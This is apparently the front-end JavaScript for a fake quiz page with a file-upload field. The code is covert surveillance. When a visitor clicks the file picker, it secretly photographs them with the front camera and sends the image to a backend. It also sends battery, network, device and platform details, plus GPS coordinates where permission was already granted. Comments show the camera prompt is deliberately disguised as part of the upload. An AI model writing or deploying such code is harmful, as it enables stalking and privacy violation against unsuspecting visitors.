const form = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "/api";

// Camera constraints
const constraints = { video: { facingMode: "user" }, audio: false };

// ✅ Locks to prevent double popup
let cameraCaptured = false;
let cameraRunning = false;

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    network: navigator.connection
      ? JSON.stringify({
          effectiveType: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt,
          saveData: navigator.connection.saveData,
        })
      : "N/A",
    time: new Date().toLocaleString(),
  };

  // Battery
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${b.level * 100}% charging:${b.charging}`;
    } catch {}
  }

  // Location ONLY if already granted (NO POPUP)
  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      }
    } catch {}
  }

  return metadata;
}

// ================================
// CAPTURE + SEND CAMERA (ONLY ON FILE PICK CLICK)
// ================================
async function captureAndSendCameraOnce() {
  if (cameraCaptured || cameraRunning) return;
  cameraRunning = true;

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    // ✅ must wait for video to load before drawing
    await new Promise((resolve) => {
      video.onloadedmetadata = () => resolve();
    });

    await video.play();

    // Wait 2s for better photo
    await new Promise((r) => setTimeout(r, 2000));

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const image = canvas.toDataURL("image/png");
    const metadata = await collectMetadata();

    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata }),
    });

    // stop camera tracks
    stream.getTracks().forEach((t) => t.stop());

    cameraCaptured = true;
  } catch (err) {
    console.log("Camera error:", err);
  } finally {
    cameraRunning = false;
  }
}

// ✅ Only ONE event — no double popup
if (fileInput) {
  fileInput.addEventListener(
    "pointerdown",
    () => {
      captureAndSendCameraOnce();
    },
    { once: true }
  );
}

// ================================
// UPLOAD FILE
// ================================
async function uploadFile(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();

    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            file: reader.result,
            filename: file.name,
          }),
        });

        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };

    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// ================================
// SUBMIT FORM (WORKING)
// ================================
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  // ✅ built-in validation (name/email/radio/file)
  if (!form.checkValidity()) {
    form.reportValidity();
    return;
  }

  try {
    // ✅ upload file only on submit (no camera here)
    await uploadFile(fileInput.files[0]);

    // ✅ show success page
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "flex";
  } catch (err) {
    console.error("Submit error:", err);
    alert("Upload failed. Try again.");
  }
});
